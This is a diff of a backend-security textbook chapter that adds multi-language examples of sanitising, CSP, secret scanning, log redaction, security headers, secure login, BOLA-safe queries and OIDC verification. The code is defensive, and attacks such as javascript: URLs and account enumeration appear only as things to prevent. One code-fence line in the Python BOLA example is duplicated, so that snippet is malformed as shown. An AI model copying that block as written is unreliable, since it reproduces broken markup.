+        .allowAttributes("href").onElements("a")
+        // Restrict the URL schemes, or href="javascript:..." gets through
+        .allowUrlProtocols("http", "https", "mailto")
+        .requireRelNofollowOnLinks()
+        .toFactory();
+
+    public static String sanitise(String rawHtml) {
+        return POLICY.sanitize(rawHtml);
+    }
+}
+
+// Thymeleaf and JSP escape by default on output, which is the other half
+// of the defence. The rule across all five tabs is the same: sanitise on
+// the way IN if you must store HTML, and escape on the way OUT always.
+```
+
 ### Content Security Policy (CSP): Last Line of Defence
 
 CSP is an HTTP response header that tells the browser _exactly_ which scripts are allowed to run. Even if an attacker injects a `<script>` tag, the browser blocks it if it violates the policy.
 
-```text
-HTTP Header / CSP# Only load scripts from your own domain. Block all inline scripts.
+```http title="the CSP header"
+# Only load scripts from your own domain. Block all inline scripts.
 Content-Security-Policy: default-src 'self';
                          script-src 'self';
                          object-src 'none';
@@ -601,8 +1287,8 @@ The most catastrophically common mistake: API keys, database passwords, JWT secr
 **If you accidentally commit a secret to Git, immediately rotate/revoke it.** Deleting the file in a new commit does not remove it from history. Assume the secret is compromised the moment it touched a remote repository.
 </Callout>
 
-```text
-Shell / Pre-commit hook with gitleaks# Install: brew install gitleaks
+```bash title="pre-commit hook with gitleaks"
+# Install: brew install gitleaks
 # .git/hooks/pre-commit
 gitleaks protect --staged --no-git -v
 # Blocks commit if API keys, passwords, tokens detected in staged files
@@ -616,8 +1302,12 @@ In development, log level is typically `DEBUG`, full stack traces, SQL queries, 
 - File paths and function names -> reveals codebase structure.
 - User PII accidentally logged -> GDPR violation + breach liability.
 
-```go
-Go / Environment-aware log levelimport "log/slog"
+Go Python JavaScript TypeScript Java
+
+debug in development, info in production, and never the request body
+
+```go title="environment-aware log level"
+import "log/slog"
 
 func setupLogger() {
     level := slog.LevelInfo  // default: production
@@ -627,6 +1317,93 @@ func setupLogger() {
     slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout,
         &slog.HandlerOptions{Level: level})))
 }
+```
+
+```python title="environment-aware log level"
+import logging
+import os
+
+
+def setup_logger() -> None:
+    level = logging.INFO  # default: production
+    if os.getenv("APP_ENV") == "development":
+        level = logging.DEBUG
+
+    logging.basicConfig(level=level, format="%(message)s")
+
+    # Third-party libraries are the usual leak: SQLAlchemy's engine
+    # logger prints every query WITH its bound parameters at DEBUG,
+    # which in production means passwords and tokens in your log
+    # aggregator. Pin the noisy ones explicitly.
+    logging.getLogger("sqlalchemy.engine").setLevel(logging.WARNING)
+    logging.getLogger("httpx").setLevel(logging.WARNING)
+```
+
+```js title="environment-aware log level"
+import pino from 'pino'
+
+export const log = pino({
+  // default: production
+  level: process.env.APP_ENV === 'development' ? 'debug' : 'info',
+
+  // Redaction is the part that matters here. A debug log of `req` is an
+  // enormous object, and it contains the Authorization header and the
+  // password field of the body you were trying to inspect.
+  redact: [
+    'req.headers.authorization',
+    'req.headers.cookie',
+    '*.password',
+    '*.token',
+    '*.apiKey',
+  ],
+})
+```
+
+```ts title="environment-aware log level"
+import pino, { type Level } from 'pino'
+
+type Env = 'development' | 'staging' | 'production'
+
+const LEVELS: Record<Env, Level> = {
+  development: 'debug', // everything
+  staging: 'info',
+  production: 'info',   // never debug in production
+}
+
+const env = (process.env.APP_ENV ?? 'production') as Env
+//                                   ^ default to the SAFE value. A
+//                                     missing variable must not turn
+//                                     debug logging on in production.
+
+export const log = pino({
+  level: LEVELS[env],
+  redact: ['req.headers.authorization', 'req.headers.cookie',
+           '*.password', '*.token', '*.apiKey'],
+})
+```
+
+```java title="environment-aware log level"
+// Configuration, not code, and driven by the Spring profile:
+//
+//   <configuration>
+//     <springProfile name="production">
+//       <root level="INFO"/>
+//       <!-- These two are the ones that leak. Hibernate's parameter
+//            binder logs every bound value, which is every password
+//            you ever hashed and every token you ever stored. -->
+//       <logger name="org.hibernate.SQL" level="WARN"/>
+//       <logger name="org.hibernate.orm.jdbc.bind" level="WARN"/>
+//       <logger name="org.springframework.web" level="WARN"/>
+//     </springProfile>
+//
+//     <springProfile name="default">
+//       <root level="DEBUG"/>
+//     </springProfile>
+//   </configuration>
+
+// And explicitly OFF in production, because both print request bodies:
+//   spring.jpa.show-sql: false
+//   server.error.include-stacktrace: never
 ```
 
 ### (3) Security Headers
@@ -641,8 +1418,12 @@ A single middleware call adds all industry-standard security headers. Every majo
 | `Strict-Transport-Security`       | Forces HTTPS, prevents SSL stripping                    |
 | `Referrer-Policy`                 | Controls how much referrer info is sent cross-origin    |
 
-```text
-Go / Secure Headers Middleware (chi/middleware)import "github.com/go-chi/chi/v5/middleware"
+Go Python JavaScript TypeScript Java
+
+set them once, in middleware, for every response
+
+```go title="secure headers middleware / chi"
+import "github.com/go-chi/chi/v5/middleware"
 
 r.Use(middleware.SetHeader("X-Frame-Options", "DENY"))
 r.Use(middleware.SetHeader("X-Content-Type-Options", "nosniff"))
@@ -653,6 +1434,102 @@ r.Use(middleware.SetHeader(
 r.Use(middleware.SetHeader(
     "Content-Security-Policy",
     "default-src 'self'; script-src 'self'; object-src 'none'"))
+```
+
+```python title="secure headers middleware"
+from starlette.middleware.base import BaseHTTPMiddleware
+
+HEADERS = {
+    "X-Frame-Options": "DENY",
+    "X-Content-Type-Options": "nosniff",
+    "Referrer-Policy": "strict-origin-when-cross-origin",
+    "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
+    "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none'",
+}
+
+
+class SecurityHeaders(BaseHTTPMiddleware):
+    async def dispatch(self, request, call_next):
+        response = await call_next(request)
+        response.headers.update(HEADERS)
+        return response
+
+
+app.add_middleware(SecurityHeaders)
+```
+
+```js title="helmet"
+import helmet from 'helmet'
+
+// helmet() sets sensible defaults for all of these and more, in one line
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      objectSrc: ["'none'"],
+    },
+  },
+  strictTransportSecurity: {
+    maxAge: 63_072_000,
+    includeSubDomains: true,
+    preload: true,
+  },
+  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+}))
+
+// Worth knowing what helmet does NOT do: it will not set HSTS on a
+// plain-HTTP response, so behind a proxy you still need
+// app.set('trust proxy', 1) for the header to appear at all.
+```
+
+```ts title="helmet"
+import helmet, { type HelmetOptions } from 'helmet'
+
+// Pinning the options in a typed constant means a directive removed by
+// a careless edit is visible in review rather than silently absent, and
+// a misspelled directive name fails the build.
+const SECURITY: HelmetOptions = {
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],   // no 'unsafe-inline': that voids the CSP
+      objectSrc: ["'none'"],
+      frameAncestors: ["'none'"], // the modern X-Frame-Options
+    },
+  },
+  strictTransportSecurity: { maxAge: 63_072_000, includeSubDomains: true, preload: true },
+  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+}
+
+app.use(helmet(SECURITY))
+
+// Roll a CSP out with Content-Security-Policy-Report-Only first. A
+// strict policy on an existing app breaks something almost every time,
+// and report-only tells you what without taking the site down.
+```
+
+```java title="Spring Security headers"
+// Spring Security sets most of these by DEFAULT the moment it is on the
+// classpath: X-Content-Type-Options, X-Frame-Options: DENY, and cache
+// control. CSP and HSTS preload are the two you configure yourself.
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .headers(headers -> headers
+            .frameOptions(frame -> frame.deny())
+            .contentTypeOptions(Customizer.withDefaults())
+            .referrerPolicy(ref -> ref.policy(
+                ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
+            .httpStrictTransportSecurity(hsts -> hsts
+                .maxAgeInSeconds(63_072_000)
+                .includeSubDomains(true)
+                .preload(true))
+            .contentSecurityPolicy(csp -> csp
+                .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'"))
+        )
+        .build();
+}
 ```
 
 13
@@ -675,12 +1552,18 @@ If you ask these three questions for every piece of code that handles user input
 
 14
 
-## Go: Secure Patterns Reference
+## Secure Patterns Reference
+
+Everything from this chapter, assembled. Read one tab end to end and you have the whole checklist in one place: validate the shape, query with parameters, verify in constant time, answer with a **generic** error either way, mint the session id from a CSPRNG, and set all three cookie flags.
 
 ### Complete Secure Login Endpoint
 
-```go
-Gofunc loginHandler(db *pgxpool.Pool, redis *redis.Client) http.HandlerFunc {
+Go Python JavaScript TypeScript Java
+
+validate, parameterise, verify, generic error, CSPRNG token, flagged cookie
+
+```go title="the complete secure login endpoint"
+func loginHandler(db *pgxpool.Pool, redis *redis.Client) http.HandlerFunc {
     return func(w http.ResponseWriter, r *http.Request) {
         var req struct {
             Email    string `json:"email"`
@@ -732,12 +1615,8 @@ func generateSecureToken(n int) string {
 }
 ```
 
-15
-
-## Python: Secure Patterns Reference
-
-```python
-Python / FastAPI Secure Authfrom fastapi import FastAPI, HTTPException, Response
+```python title="FastAPI secure auth"
+from fastapi import FastAPI, HTTPException, Response
 from argon2 import PasswordHasher
 from argon2.exceptions import VerifyMismatchError
 import secrets
@@ -776,8 +1655,194 @@ async def login(email: str, password: str, response: Response):
     return {"status": "ok"}
 ```
 
-```python
-Python / BOLA-safe DB queryasync def get_invoice(invoice_id: int, current_user_id: int):
+```js title="Express secure login"
+import { randomBytes } from 'node:crypto'
+import argon2 from 'argon2'
+
+app.post('/login', loginLimiter, async (req, res) => {
+  const { email, password } = req.body ?? {}
+
+  // 1. Validate format (first line of defence)
+  if (typeof email !== 'string' || typeof password !== 'string' ||
+      !isValidEmail(email) || password.length < 8) {
+    return res.status(400).json({ error: 'invalid credentials' })
+  }
+
+  // 2. Parameterised query, no SQL injection possible
+  const { rows } = await db.query(
+    'SELECT id, password_hash FROM users WHERE email = $1', [email])
+  const user = rows[0]
+
+  // 3. Generic error, never reveal whether the email exists.
+  //    Note the dummy verify: skipping the hash when the user is not
+  //    found returns in 1ms instead of 100ms, and that timing
+  //    difference is a working account-enumeration oracle.
+  const hash = user?.password_hash ?? DUMMY_HASH
+  const valid = (await argon2.verify(hash, password)) && user !== undefined
+
+  if (!valid) {
+    return res.status(401).json({ error: 'invalid email or password' })
+  }
+
+  // 4. Cryptographically secure session ID (crypto, never Math.random)
+  const sessionId = randomBytes(32).toString('base64url')
+
+  // 5. Store session in Redis with a TTL
+  await redis.set(`session:${sessionId}`, user.id, { EX: 7 * 24 * 3600 })
+
+  // 6. Secure cookie: HttpOnly, Secure, SameSite=Strict
+  res.cookie('session_id', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 7 * 24 * 3600 * 1000,
+  })
+
+  res.sendStatus(200)
+})
+```
+
+```ts title="Express secure login"
+import { randomBytes } from 'node:crypto'
+import { z } from 'zod'
+import argon2 from 'argon2'
+import type { Request, Response } from 'express'
+
+// 1. Validate format as a SCHEMA, so the shape check and the type come
+//    from one declaration and cannot drift apart.
+const LoginBody = z.object({
+  email: z.string().email(),
+  password: z.string().min(8),
+})
+
+export async function login(req: Request, res: Response): Promise<void> {
+  const parsed = LoginBody.safeParse(req.body)
+  if (!parsed.success) {
+    res.status(400).json({ error: 'invalid credentials' })
+    return
+  }
+  const { email, password } = parsed.data
+
+  // 2. Parameterised query, no SQL injection possible
+  const { rows } = await db.query<{ id: string; password_hash: string }>(
+    'SELECT id, password_hash FROM users WHERE email = $1', [email])
+  const user = rows[0]
+
+  // 3. Constant-time-ish: always run the hash, so a missing user takes
+  //    the same ~100ms as a wrong password. Generic error either way.
+  const hash = user?.password_hash ?? DUMMY_HASH
+  const ok = await argon2.verify(hash, password).catch(() => false)
+
+  if (!ok || user === undefined) {
+    res.status(401).json({ error: 'invalid email or password' })
+    return
+  }
+
+  // 4. 32 bytes = 256 bits from the CSPRNG. Math.random() is seeded and
+  //    predictable, and a predictable session id is a full account
+  //    takeover, not a theoretical weakness.
+  const sessionId = randomBytes(32).toString('base64url')
+
+  // 5 + 6. Store server-side, hand out only the opaque id
+  await redis.set(`session:${sessionId}`, user.id, { EX: 7 * 24 * 3600 })
+  res.cookie('session_id', sessionId, SESSION_COOKIE) // see sec 06
+  res.sendStatus(200)
+}
+```
+
+```java title="Spring Boot secure login"
+@RestController
+class AuthController {
+    private static final SecureRandom RANDOM = new SecureRandom();
+
+    private final JdbcClient db;
+    private final PasswordEncoder encoder;
+    private final StringRedisTemplate redis;
+
+    @PostMapping("/login")
+    ResponseEntity<?> login(@Valid @RequestBody LoginRequest req,
+                            HttpServletResponse response) {
+        // 1. Validate format: @Valid + the record's own constraints did
+        //    it before this method ran. See chapter 05.
+
+        // 2. Parameterised query, no SQL injection possible
+        Optional<UserRow> user = db.sql(
+                "SELECT id, password_hash FROM users WHERE email = ?")
+            .param(req.email())
+            .query(UserRow.class)
+            .optional();
+
+        // 3. Always run the hash, even when the user is absent, so the
+        //    response time does not reveal which emails are registered.
+        String hash = user.map(UserRow::passwordHash).orElse(DUMMY_HASH);
+        boolean valid = encoder.matches(req.password(), hash) && user.isPresent();
+
+        if (!valid) {
+            // Generic error, never reveal whether the email exists
+            return ResponseEntity.status(401)
+                .body(Map.of("error", "invalid email or password"));
+        }
+
+        // 4. Cryptographically secure session ID. SecureRandom, never
+        //    java.util.Random, whose seed is guessable from two outputs.
+        byte[] bytes = new byte[32];
+        RANDOM.nextBytes(bytes);
+        String sessionId = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
+
+        // 5. Store session in Redis with a TTL
+        redis.opsForValue().set("session:" + sessionId, user.get().id(),
+            Duration.ofDays(7));
+
+        // 6. Secure cookie: HttpOnly, Secure, SameSite=Strict
+        ResponseCookie cookie = ResponseCookie.from("session_id", sessionId)
+            .httpOnly(true).secure(true).sameSite("Strict")
+            .maxAge(Duration.ofDays(7)).path("/")
+            .build();
+        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+
+        return ResponseEntity.ok().build();
+    }
+}
+
+// Record it, whichever way it went. A failed login that nobody can see
+// is a brute-force attempt nobody can alert on.
+```
+
+### The BOLA-safe query
+
+Go Python JavaScript TypeScript Java
+
+the ownership check belongs IN the WHERE clause, not after the row comes back
+
+```go title="BOLA-safe DB query"
+func GetInvoice(ctx context.Context, db *pgxpool.Pool,
+    invoiceID int64, currentUserID string) (*Invoice, error) {
+
+    var inv Invoice
+    // Ownership check IN the query, not after it. Fetching first and
+    // comparing afterwards works right up until somebody adds an early
+    // return, or logs the row, or the comparison is against the wrong
+    // field. In the WHERE clause it cannot be skipped.
+    err := db.QueryRow(ctx, `
+        SELECT id, amount, user_id
+        FROM   invoices
+        WHERE  id = $1 AND user_id = $2`,
+        invoiceID, currentUserID,
+    ).Scan(&inv.ID, &inv.Amount, &inv.UserID)
+
+    if errors.Is(err, pgx.ErrNoRows) {
+        // 404, not 403. A 403 confirms the invoice EXISTS, which hands
+        // an attacker a working oracle for enumerating other people's
+        // ids one request at a time.
+        return nil, apperr.NotFound("invoice")
+    }
+    return &inv, err
+}
+```
+
+```python title="BOLA-safe DB query"
+```python title="BOLA-safe DB query"
+async def get_invoice(invoice_id: int, current_user_id: int):
     # ownership check IN the query, not after
     row = await db.fetchrow(
         "SELECT * FROM invoices WHERE id=$1 AND user_id=$2",
@@ -787,6 +1852,75 @@ Python / BOLA-safe DB queryasync def get_invoice(invoice_id: int, current_user_i
         # 404, not 403. Don't confirm the invoice exists.
         raise HTTPException(404, "invoice not found")
     return row
+```
+
+```js title="BOLA-safe DB query"
+export async function getInvoice(invoiceId, currentUserId) {
+  // Ownership check IN the query, not after
+  const { rows } = await db.query(
+    'SELECT * FROM invoices WHERE id = $1 AND user_id = $2',
+    [invoiceId, currentUserId],
+  )
+
+  if (rows.length === 0) {
+    // 404, not 403. Don't confirm the invoice exists.
+    throw notFound('invoice')
+  }
+  return rows[0]
+}
+
+// The currentUserId comes from the SESSION, never from the request. An
+// id taken from the body or a query param is not an ownership check at
+// all, it is the attacker telling you who to pretend they are.
+```
+
+```ts title="BOLA-safe DB query"
+// Making the caller pass the viewer explicitly, as a required argument,
+// is the structural version of this rule: a repository method that
+// cannot be called without a user id is one nobody can accidentally
+// call without the ownership filter.
+export async function getInvoice(
+  invoiceId: number,
+  currentUserId: string, // required, and it comes from the session
+): Promise<Invoice> {
+  const { rows } = await db.query<Invoice>(
+    'SELECT id, amount, user_id FROM invoices WHERE id = $1 AND user_id = $2',
+    [invoiceId, currentUserId],
+  )
+
+  const invoice = rows[0]
+  if (invoice === undefined) {
+    // 404, not 403. A 403 confirms the row exists and turns the endpoint
+    // into an enumeration oracle for other users' invoice ids.
+    throw notFound('invoice')
+  }
+  return invoice
+}
+```
+
+```java title="BOLA-safe DB query"
+public Invoice getInvoice(long invoiceId, String currentUserId) {
+    // Ownership check IN the query, not after
+    return db.sql("""
+            SELECT id, amount, user_id
+            FROM   invoices
+            WHERE  id = ? AND user_id = ?
+            """)
+        .params(invoiceId, currentUserId)
+        .query(Invoice.class)
+        .optional()
+        // 404, not 403. Don't confirm the invoice exists.
+        .orElseThrow(() -> new ResponseStatusException(
+            HttpStatus.NOT_FOUND, "invoice not found"));
+}
+
+// With Spring Data, the same rule is expressed in the method name, and
+// it is worth preferring for exactly that reason: findById(id) is one
+// keystroke away and is the vulnerable version.
+//   Optional<Invoice> findByIdAndUserId(long id, String userId);
+
+// The currentUserId must come from the SecurityContext, never from the
+// request:  SecurityContextHolder.getContext().getAuthentication()
 ```
 
 16
@@ -829,8 +1963,12 @@ This is the flow used by every serious web application. It keeps tokens off the 
 | **OAuth 2.0** | "What can this app do?" | Access Token (opaque or JWT)                     |
 | **OIDC**      | "Who is this user?"     | ID Token (always JWT with `sub`, `email`, `iat`) |
 
-```go
-Go / Verify OIDC ID Token (google/go-oidc)import (
+Go Python JavaScript TypeScript Java
+
+check the state, exchange the code server-side, then VERIFY the ID token
+
+```go title="verify an OIDC ID token / go-oidc"
+import (
     "github.com/coreos/go-oidc/v3/oidc"
     "golang.org/x/oauth2"
 )
@@ -872,6 +2010,168 @@ func callbackHandler(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
+```python title="verify an OIDC ID token / authlib"
+from authlib.integrations.starlette_client import OAuth
+
+oauth = OAuth()
+oauth.register(
+    name="google",
+    server_metadata_url="https://accounts.google.com/.well-known/openid-configuration",
+    client_id=os.environ["GOOGLE_CLIENT_ID"],
+    client_secret=os.environ["GOOGLE_CLIENT_SECRET"],
+    client_kwargs={"scope": "openid email profile"},
+)
+
+
+@app.get("/auth/login")
+async def login(request: Request):
+    # authlib generates and stores `state` (and the PKCE verifier) itself
+    return await oauth.google.authorize_redirect(
+        request, "https://yourapp.com/auth/callback")
+
+
+@app.get("/auth/callback")
+async def callback(request: Request):
+    # 1 + 2 + 3. state check, code exchange and ID-token verification
+    # (signature, iss, aud, exp) all happen inside authorize_access_token.
+    # Doing any of them by hand is how people get this wrong.
+    token = await oauth.google.authorize_access_token(request)
+
+    # 4. Extract claims
+    claims = token["userinfo"]
+
+    # 5. Upsert user, create session, set cookie
+    user_id = await upsert_user(claims["sub"], claims["email"])
+    return set_secure_session_cookie(user_id)
+```
+
+```js title="verify an OIDC ID token / openid-client"
+import * as client from 'openid-client'
+
+const config = await client.discovery(
+  new URL('https://accounts.google.com'),
+  process.env.GOOGLE_CLIENT_ID,
+  process.env.GOOGLE_CLIENT_SECRET,
+)
+
+app.get('/auth/login', async (req, res) => {
+  const codeVerifier = client.randomPKCECodeVerifier()
+  const state = client.randomState()
+
+  // Both go in the SESSION, never in a cookie the client can edit
+  req.session.codeVerifier = codeVerifier
+  req.session.state = state
+
+  res.redirect(client.buildAuthorizationUrl(config, {
+    redirect_uri: 'https://yourapp.com/auth/callback',
+    scope: 'openid email profile',
+    state,
+    code_challenge: await client.calculatePKCECodeChallenge(codeVerifier),
+    code_challenge_method: 'S256',
+  }).href)
+})
+
+app.get('/auth/callback', async (req, res) => {
+  // 1, 2 and 3: the library checks state, exchanges the code
+  // server-to-server, and verifies the ID token's signature, iss, aud
+  // and exp. Never decode an ID token with jwt.decode() and trust it:
+  // decoding is not verifying, and an unverified token is attacker input.
+  const tokens = await client.authorizationCodeGrant(config, new URL(req.url, BASE), {
+    pkceCodeVerifier: req.session.codeVerifier,
+    expectedState: req.session.state,
+  })
+
+  // 4. Extract claims
+  const claims = tokens.claims()
+
+  // 5. Upsert user, create session, set cookie
+  const userId = await upsertUser(claims.sub, claims.email)
+  setSecureSessionCookie(res, userId)
+  res.redirect('/dashboard')
+})
+```
+
+```ts title="verify an OIDC ID token / openid-client"
+import * as client from 'openid-client'
+import type { Request, Response } from 'express'
+
+// Typing the claims you actually rely on is worth doing, because the
+// set varies by provider: `email_verified` is present for Google and
+// absent for some others, and treating a missing value as "verified"
+// lets anyone register an account with someone else's address.
+interface IdTokenClaims {
+  sub: string
+  email: string
+  email_verified?: boolean
+}
+
+export async function callback(req: Request, res: Response): Promise<void> {
+  const tokens = await client.authorizationCodeGrant(
+    config,
+    new URL(req.url, process.env.BASE_URL!),
+    {
+      pkceCodeVerifier: req.session.codeVerifier!,
+      expectedState: req.session.state!,
+    },
+  )
+
+  const claims = tokens.claims() as unknown as IdTokenClaims
+
+  // `sub` is the stable identifier, NOT the email. An email can be
+  // changed or reassigned at the provider; keying your user rows on it
+  // eventually merges two people into one account.
+  if (claims.email_verified !== true) {
+    res.status(403).send('email not verified')
+    return
+  }
+
+  const userId = await upsertUser(claims.sub, claims.email)
+  setSecureSessionCookie(res, userId)
+  res.redirect('/dashboard')
+}
+```
+
+```java title="OIDC login / Spring Security"
+// Spring Security implements the entire Authorization Code flow,
+// including state, PKCE and full ID-token validation. The correct
+// amount of security code to write here is close to zero.
+//
+//   implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
+//
+//   spring.security.oauth2.client:
+//     registration.google:
+//       client-id: ${GOOGLE_CLIENT_ID}
+//       client-secret: ${GOOGLE_CLIENT_SECRET}
+//       scope: openid,email,profile
+//     provider.google:
+//       issuer-uri: https://accounts.google.com
+
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .authorizeHttpRequests(auth -> auth
+            .requestMatchers("/", "/login/**").permitAll()
+            .anyRequest().authenticated())
+        .oauth2Login(oauth -> oauth
+            .defaultSuccessUrl("/dashboard", true)
+            .userInfoEndpoint(u -> u.oidcUserService(this::loadUser)))
+        .build();
+}
+
+// The only part worth writing yourself: mapping the verified claims
+// onto your own user row.
+private OidcUser loadUser(OidcUserRequest request) {
+    OidcUser oidcUser = new OidcUserService().loadUser(request);
+
+    // `sub` is the stable id. Never key your users table on email.
+    String userId = upsertUser(
+        oidcUser.getSubject(),
+        oidcUser.getEmail());
+
+    return oidcUser;
+}
+```
+
 17
 
 ## HTTPS & TLS Internals
@@ -910,8 +2210,8 @@ HTTPS is HTTP with a TLS (Transport Layer Security) layer between the TCP connec
 - Disable TLS 1.0 and TLS 1.1, they have known vulnerabilities (POODLE, BEAST). Only allow TLS 1.2 and TLS 1.3.
 - Test your TLS config at [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/), aim for an A+ rating.
 
-```text
-Caddy / Automatic HTTPS (zero config)# Caddyfile, Caddy automatically obtains and renews Let's Encrypt certs
+```caddy title="Caddy / automatic HTTPS, zero config"
+# Caddyfile, Caddy automatically obtains and renews Let's Encrypt certs
 yourapp.com {
     reverse_proxy localhost:8080
     # TLS 1.2+ enforced, HSTS set, HTTP redirected, all automatic
@@ -981,8 +2281,8 @@ The mindset shift that matters most: stop thinking "will users do this?" and sta
 
 ### Automated Security Testing in CI/CD
 
-```bash
-GitHub Actions / Security scan on every PRname: Security Scan
+```yaml title=".github/workflows/security.yaml / scan on every PR"
+name: Security Scan
 on: [pull_request]
 
 jobs:
@@ -1099,4 +2399,4 @@ Attackers stole encrypted password vaults of all LastPass customers. Ongoing bru
 
 Backend Field Manual / Backend Security / Chapter 17 (Extended)
 
-Backend from First Principles / Chapter 17 / Security. Code targets Go 1.22+ and Python 3.11+.
+Backend from First Principles / Chapter 17 / Security. Code targets Go 1.22+, Python 3.11+, Node.js 20+, TypeScript 5+ and Java 17+ (Spring Boot).
